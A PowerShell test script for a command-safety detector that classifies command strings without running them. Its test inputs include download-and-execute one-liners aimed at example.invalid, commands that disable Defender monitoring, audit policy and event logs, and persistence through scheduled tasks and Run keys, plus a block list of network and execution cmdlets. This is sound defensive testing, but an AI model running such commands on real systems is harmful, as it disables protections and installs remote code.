[CmdletBinding()]
param()

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

$projectRoot = Split-Path -Parent $PSScriptRoot
$moduleManifest = Join-Path `
    $projectRoot `
    'src\SumiGuard.CommandAssessment\SumiGuard.CommandAssessment.psd1'
$moduleFile = Join-Path `
    $projectRoot `
    'src\SumiGuard.CommandAssessment\SumiGuard.CommandAssessment.psm1'
$results = New-Object System.Collections.Generic.List[object]
$failure = $null
$assessmentModule = $null
$executionCounter = 0

function Assert-Test {
    param(
        [Parameter(Mandatory = $true)][bool]$Condition,
        [Parameter(Mandatory = $true)][string]$Message
    )

    if (-not $Condition) {
        throw [System.InvalidOperationException]::new($Message)
    }
}

function Get-TestExecutionId {
    $script:executionCounter++
    return $script:executionCounter.ToString('x32')
}

function Assert-FixedAssessmentShape {
    param([Parameter(Mandatory = $true)]$Assessment)

    $expectedProperties = @(
        'schema_version',
        'record_id',
        'record_type',
        'execution_id',
        'occurred_at_utc',
        'assessment_status',
        'assessment_reason_code',
        'ruleset_version',
        'findings',
        'content_included',
        'source_excerpt_included',
        'monitor_action',
        'automatic_deny')
    $actualProperties = @($Assessment.PSObject.Properties.Name)
    Assert-Test ($actualProperties.Count -eq $expectedProperties.Count) `
        'Assessment returned an unexpected property count.'
    for ($index = 0; $index -lt $expectedProperties.Count; $index++) {
        Assert-Test ($actualProperties[$index] -ceq $expectedProperties[$index]) `
            'Assessment returned an unexpected property.'
    }
    $recordId = [Guid]::Empty
    Assert-Test ([Guid]::TryParseExact([string]$Assessment.record_id, 'N', [ref]$recordId)) `
        'Assessment record ID is invalid.'
    $occurredAt = [DateTimeOffset]::MinValue
    Assert-Test ([DateTimeOffset]::TryParse([string]$Assessment.occurred_at_utc, [ref]$occurredAt)) `
        'Assessment timestamp is invalid.'
    Assert-Test ([int]$Assessment.schema_version -eq 1) 'Unexpected schema version.'
    Assert-Test ([string]$Assessment.record_type -ceq 'ExecutionSafetyAssessment') `
        'Unexpected assessment record type.'
    Assert-Test ([string]$Assessment.ruleset_version -ceq 'sumi-guard-command-rules/1.0.0') `
        'Unexpected ruleset version.'
    Assert-Test (-not [bool]$Assessment.content_included) `
        'Assessment claimed to include command content.'
    Assert-Test (-not [bool]$Assessment.source_excerpt_included) `
        'Assessment claimed to include a source excerpt.'
    Assert-Test ([string]$Assessment.monitor_action -ceq 'WARN_ONLY') `
        'Assessment monitor action changed.'
    Assert-Test (-not [bool]$Assessment.automatic_deny) `
        'Assessment enabled automatic deny.'
    Assert-Test ($actualProperties -cnotcontains 'execution_status') `
        'Assessment coupled safety evaluation to execution status.'
}

function Assert-AssessmentCase {
    param(
        [Parameter(Mandatory = $true)][string]$Name,
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$CommandText,
        [Parameter(Mandatory = $true)]
        [ValidateSet('DETECTED', 'NO_DETECTION', 'UNASSESSABLE', 'EVALUATION_FAILED')]
        [string]$ExpectedStatus,
        [AllowNull()][string]$ExpectedReasonCode,
        [string[]]$ExpectedRuleIds = @(),
        [ValidateSet('WINDOWS_POWERSHELL', 'OTHER', 'UNKNOWN')]
        [string]$InterpreterKind = 'WINDOWS_POWERSHELL',
        [bool]$InterpreterVerified = $true
    )

    $executionId = Get-TestExecutionId
    $assessment = Invoke-SumiGuardCommandAssessment `
        -CommandText $CommandText `
        -ExecutionId $executionId `
        -InterpreterKind $InterpreterKind `
        -InterpreterVerified $InterpreterVerified
    Assert-FixedAssessmentShape -Assessment $assessment
    Assert-Test ([string]$assessment.execution_id -ceq $executionId) `
        ('Execution ID changed in case {0}.' -f $Name)
    Assert-Test ([string]$assessment.assessment_status -ceq $ExpectedStatus) `
        ('Unexpected assessment status in case {0}.' -f $Name)
    Assert-Test ([string]$assessment.assessment_reason_code -ceq [string]$ExpectedReasonCode) `
        ('Unexpected assessment reason in case {0}.' -f $Name)

    $findings = @($assessment.findings)
    Assert-Test ($findings.Count -eq $ExpectedRuleIds.Count) `
        ('Unexpected finding count in case {0}.' -f $Name)
    $expectedRuleMetadata = @{
        'SG-CMD-001' = @('1.0.0', 'HIGH', 'DOWNLOAD_TO_EXECUTION_FLOW')
        'SG-CMD-002' = @('1.0.0', 'HIGH', 'SECURITY_CONTROL_DISABLE_MUTATION')
        'SG-CMD-003' = @('1.0.0', 'MEDIUM', 'PERSISTENCE_REGISTRATION_MUTATION')
    }
    for ($index = 0; $index -lt $ExpectedRuleIds.Count; $index++) {
        $expectedRuleId = $ExpectedRuleIds[$index]
        $finding = $findings[$index]
        $findingProperties = @($finding.PSObject.Properties.Name)
        Assert-Test ($findingProperties.Count -eq 4) `
            ('Finding property count changed in case {0}.' -f $Name)
        Assert-Test ($findingProperties[0] -ceq 'rule_id' -and
            $findingProperties[1] -ceq 'rule_version' -and
            $findingProperties[2] -ceq 'severity' -and
            $findingProperties[3] -ceq 'reason_code') `
            ('Finding shape changed in case {0}.' -f $Name)
        Assert-Test ([string]$finding.rule_id -ceq $expectedRuleId) `
            ('Unexpected rule ID in case {0}.' -f $Name)
        Assert-Test ([string]$finding.rule_version -ceq $expectedRuleMetadata[$expectedRuleId][0]) `
            ('Unexpected rule version in case {0}.' -f $Name)
        Assert-Test ([string]$finding.severity -ceq $expectedRuleMetadata[$expectedRuleId][1]) `
            ('Unexpected severity in case {0}.' -f $Name)
        Assert-Test ([string]$finding.reason_code -ceq $expectedRuleMetadata[$expectedRuleId][2]) `
            ('Unexpected rule reason in case {0}.' -f $Name)
    }

    $results.Add([pscustomobject][ordered]@{
        name = $Name
        passed = $true
        assessment_status = [string]$assessment.assessment_status
        assessment_reason_code = [string]$assessment.assessment_reason_code
        rule_ids = @($findings | ForEach-Object { [string]$_.rule_id })
    })
    return $assessment
}

function Assert-NoExecutableTestHarnessPath {
    param([Parameter(Mandatory = $true)][string]$Path)

    $tokens = $null
    $errors = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile(
        $Path,
        [ref]$tokens,
        [ref]$errors)
    Assert-Test (@($errors).Count -eq 0) 'Test harness has a parser error.'
    $commands = @($ast.FindAll({
        param($node)
        $node -is [System.Management.Automation.Language.CommandAst]
    }, $true))
    foreach ($command in $commands) {
        $name = $command.GetCommandName()
        if (-not [string]::IsNullOrWhiteSpace($name)) {
            Assert-Test ($name.ToLowerInvariant() -cnotin @(
                'invoke-expression', 'iex', 'start-process',
                'invoke-webrequest', 'iwr', 'curl', 'curl.exe')) `
                'Test harness contains an executable or network command path.'
        }
        Assert-Test ([string]$command.InvocationOperator -ceq 'Unknown') `
            'Test harness contains a call or dot-source operator.'
    }
}

try {
    Import-Module -Name $moduleManifest -Force -ErrorAction Stop
    $assessmentModule = Get-Module 'SumiGuard.CommandAssessment' -ErrorAction Stop

    Assert-NoExecutableTestHarnessPath -Path $PSCommandPath
    Assert-NoExecutableTestHarnessPath -Path $moduleFile
    $results.Add([pscustomobject][ordered]@{
        name = 'STATIC_NO_EXECUTION_PATH'
        passed = $true
        assessment_status = 'NOT_APPLICABLE'
        assessment_reason_code = ''
        rule_ids = @()
    })

    $null = Assert-AssessmentCase `
        -Name 'SG001_OUTFILE_VARIABLE_TO_CALL_OPERATOR' `
        -CommandText 'Invoke-WebRequest ''https://example.invalid/a.ps1'' -OutFile $p; & $p' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-001')
    $null = Assert-AssessmentCase `
        -Name 'SG001_PIPELINE_TO_INVOKE_EXPRESSION' `
        -CommandText 'iWr ''https://example.invalid/a.ps1'' | iEx' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-001')
    $null = Assert-AssessmentCase `
        -Name 'SG001_DOWNLOAD_WITHOUT_EXECUTION' `
        -CommandText 'Invoke-WebRequest ''https://example.invalid/data.json'' -OutFile $p; Get-FileHash $p' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null

    $null = Assert-AssessmentCase `
        -Name 'SG002_DEFENDER_DISABLE' `
        -CommandText 'Set-MpPreference -DisableRealtimeMonitoring $true' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-002')
    $null = Assert-AssessmentCase `
        -Name 'SG002_CASE_INSENSITIVE' `
        -CommandText 'sEt-MpPrEfErEnCe -dIsAbLeReAlTiMeMoNiToRiNg $TrUe' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-002')
    $null = Assert-AssessmentCase `
        -Name 'SG002_ENABLE_DISTINGUISHED' `
        -CommandText 'Set-MpPreference -DisableRealtimeMonitoring $false' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'SG002_AUDIT_DISABLE' `
        -CommandText 'auditpol.exe /set /category:* /success:disable' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-002')
    $null = Assert-AssessmentCase `
        -Name 'SG002_AUDIT_ENABLE_DISTINGUISHED' `
        -CommandText 'auditpol.exe /set /category:* /success:enable' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'SG002_LOG_DISABLE' `
        -CommandText 'wevtutil.exe sl SyntheticLog /e:false' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-002')
    $null = Assert-AssessmentCase `
        -Name 'SG002_REFERENCE_ONLY' `
        -CommandText 'Get-MpPreference' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null

    $null = Assert-AssessmentCase `
        -Name 'SG003_REGISTER_SCHEDULED_TASK' `
        -CommandText 'Register-ScheduledTask -TaskName ''Synthetic'' -Action $a' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-003')
    $null = Assert-AssessmentCase `
        -Name 'SG003_CASE_INSENSITIVE_SCHTASKS_CREATE' `
        -CommandText 'ScHtAsKs.ExE /CrEaTe /TN Synthetic /TR synthetic.exe' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-003')
    $null = Assert-AssessmentCase `
        -Name 'SG003_LIST_DISTINGUISHED' `
        -CommandText 'Get-ScheduledTask -TaskName ''Synthetic''' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'SG003_DELETE_DISTINGUISHED' `
        -CommandText 'schtasks.exe /delete /tn Synthetic /f' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'SG003_RUN_KEY_REGISTRATION' `
        -CommandText 'New-ItemProperty -Path ''HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'' -Name ''Synthetic'' -Value ''C:\Synthetic\app.exe''' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-003')
    $null = Assert-AssessmentCase `
        -Name 'SG003_RUN_KEY_DELETE_DISTINGUISHED' `
        -CommandText 'Remove-ItemProperty -Path ''HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'' -Name ''Synthetic''' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'SG003_AUTOMATIC_SERVICE' `
        -CommandText 'Set-Service -Name SyntheticService -StartupType Automatic' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode $null `
        -ExpectedRuleIds @('SG-CMD-003')

    $null = Assert-AssessmentCase `
        -Name 'COMMENT_ONLY' `
        -CommandText '# Set-MpPreference -DisableRealtimeMonitoring $true; Register-ScheduledTask -TaskName Synthetic' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'QUOTED_TEXT_ONLY' `
        -CommandText 'Write-Output ''Set-MpPreference -DisableRealtimeMonitoring $true; Register-ScheduledTask''' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'UNVERIFIED_INTERPRETER' `
        -CommandText 'Set-MpPreference -DisableRealtimeMonitoring $true' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'UNSUPPORTED_LANGUAGE' `
        -InterpreterVerified $false
    $null = Assert-AssessmentCase `
        -Name 'NON_POWERSHELL_INTERPRETER' `
        -CommandText 'Set-MpPreference -DisableRealtimeMonitoring $true' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'UNSUPPORTED_LANGUAGE' `
        -InterpreterKind 'OTHER'
    $null = Assert-AssessmentCase `
        -Name 'EMPTY_CONTENT' `
        -CommandText '' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'CONTENT_UNAVAILABLE'
    $null = Assert-AssessmentCase `
        -Name 'SYNTAX_ERROR' `
        -CommandText 'Write-Output ''unterminated' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'PARSE_INCOMPLETE'
    $null = Assert-AssessmentCase `
        -Name 'DYNAMIC_CALL_OPERATOR' `
        -CommandText '& $dynamicCommand $dynamicArguments' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'DYNAMIC_COMMAND_TARGET'
    $null = Assert-AssessmentCase `
        -Name 'OBFUSCATED_COMMAND_NAME' `
        -CommandText '& (''Reg'' + ''ister-ScheduledTask'') -TaskName Synthetic' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'DYNAMIC_COMMAND_TARGET'
    $null = Assert-AssessmentCase `
        -Name 'ENCODED_COMMAND_NOT_DECODED' `
        -CommandText 'powershell.exe -EncodedCommand U1lOVEhFVElD' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'ENCODED_PAYLOAD_NOT_INSPECTED'
    $null = Assert-AssessmentCase `
        -Name 'EXECUTION_POLICY_BYPASS_ONLY' `
        -CommandText 'powershell.exe -ExecutionPolicy Bypass -File .\build.ps1' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $null = Assert-AssessmentCase `
        -Name 'DYNAMIC_PERSISTENCE_TARGET' `
        -CommandText 'Set-ItemProperty -Path $dynamicPath -Name Synthetic -Value SyntheticValue' `
        -ExpectedStatus 'UNASSESSABLE' `
        -ExpectedReasonCode 'DYNAMIC_COMMAND_TARGET'
    $null = Assert-AssessmentCase `
        -Name 'DETECTION_DOMINATES_UNASSESSABLE' `
        -CommandText 'Set-MpPreference -DisableRealtimeMonitoring $true; & $dynamicCommand' `
        -ExpectedStatus 'DETECTED' `
        -ExpectedReasonCode 'PARTIAL_UNASSESSABLE' `
        -ExpectedRuleIds @('SG-CMD-002')
    $null = Assert-AssessmentCase `
        -Name 'ORDINARY_POWERSHELL' `
        -CommandText 'Get-ChildItem -LiteralPath . | Select-Object -First 1' `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null

    $canaryCommand = 'Invoke-WebRequest ''https://example.invalid/SYNTHETIC_SECRET_CANARY'' -OutFile ''C:\Synthetic\PRIVATE_PATH_CANARY.bin'''
    $canaryResult = Assert-AssessmentCase `
        -Name 'OUTPUT_EXCLUDES_INPUT_CONTENT' `
        -CommandText $canaryCommand `
        -ExpectedStatus 'NO_DETECTION' `
        -ExpectedReasonCode $null
    $canaryJson = $canaryResult | ConvertTo-Json -Compress -Depth 8
    Assert-Test (-not $canaryJson.Contains('SYNTHETIC_SECRET_CANARY')) `
        'Assessment output included a command value.'
    Assert-Test (-not $canaryJson.Contains('PRIVATE_PATH_CANARY')) `
        'Assessment output included a path value.'

    $assessmentModule.SessionState.PSVariable.Set(
        'SumiGuardTestForceEvaluationFailure',
        $true)
    try {
        $failureResult = Assert-AssessmentCase `
            -Name 'INTERNAL_ERROR_IS_DISTINCT' `
            -CommandText 'Write-Output ''SYNTHETIC_RULE_ENGINE_FAILURE_INPUT''' `
            -ExpectedStatus 'EVALUATION_FAILED' `
            -ExpectedReasonCode 'RULE_ENGINE_ERROR'
        $failureJson = $failureResult | ConvertTo-Json -Compress -Depth 8
        Assert-Test (-not $failureJson.Contains('SYNTHETIC_RULE_ENGINE_FAILURE_CANARY')) `
            'Assessment output included an exception message.'
        Assert-Test (-not $failureJson.Contains('SYNTHETIC_RULE_ENGINE_FAILURE_INPUT')) `
            'Assessment output included input from a failed evaluation.'
    }
    finally {
        $assessmentModule.SessionState.PSVariable.Set(
            'SumiGuardTestForceEvaluationFailure',
            $false)
    }
}
catch {
    $failure = [pscustomobject][ordered]@{
        type = $_.Exception.GetType().FullName
        message = $_.Exception.Message
    }
}
finally {
    if ($null -ne $assessmentModule) {
        $assessmentModule.SessionState.PSVariable.Set(
            'SumiGuardTestForceEvaluationFailure',
            $false)
    }
}

$summary = [pscustomobject][ordered]@{
    success = $null -eq $failure
    powershell_version = $PSVersionTable.PSVersion.ToString()
    test_count = $results.Count
    tests = $results.ToArray()
    failure = $failure
    command_inputs_executed = $false
    network_access_performed = $false
    external_processes_started_by_test_data = $false
    dynamic_code_evaluation_performed = $false
    execution_status_included = $false
}
$summary | ConvertTo-Json -Depth 10
if ($null -ne $failure) {
    exit 1
}
